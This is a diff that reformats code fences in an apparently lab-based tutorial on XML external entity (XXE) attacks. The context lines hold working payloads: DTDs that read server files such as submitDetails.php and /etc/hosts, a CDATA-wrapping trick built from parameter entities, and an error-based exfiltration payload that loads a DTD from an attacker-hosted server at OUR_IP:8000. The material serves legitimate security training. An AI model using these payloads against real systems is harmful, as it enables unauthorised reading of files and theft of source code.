@@ -12,8 +12,7 @@ In the previous section, we saw how we could use PHP filters to encode PHP sourc
 
 One easy way to tackle this issue would be to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
 
-```
-        xml
+```xml
 <!DOCTYPE email [
   <!ENTITY begin "<![CDATA[">
   <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
@@ -26,15 +25,13 @@ After that, if we reference the `&joined;` entity, it should contain our escaped
 
 To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
 
-```
-        xml
+```xml
 <!ENTITY joined "%begin;%file;%end;">
 ```
 
 So, let's try to read the `submitDetails.php` file by first storing the above line in a DTD file (e.g. `xxe.dtd`), host it on our machine, and then reference it as an external entity on the target web application, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 hiimeins@htb[/htb]$ python3 -m http.server 8000
 
@@ -43,8 +40,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above, which should contain the content of the `submitDetails.php` file, as follows:
 
-```
-        xml
+```xml
 <!DOCTYPE email [
   <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
   <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
@@ -78,8 +74,7 @@ Let's consider the exercise we have in `/error` at the end of this section, in w
 
 We see that we did indeed cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:
 
-```
-        xml
+```xml
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 ```
@@ -88,8 +83,7 @@ The above payload defines the `file` parameter entity and then joins it with an 
 
 Now, we can call our external DTD script, and then reference the `error` entity, as follows:
 
-```
-        xml
+```xml
 <!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
   %remote;
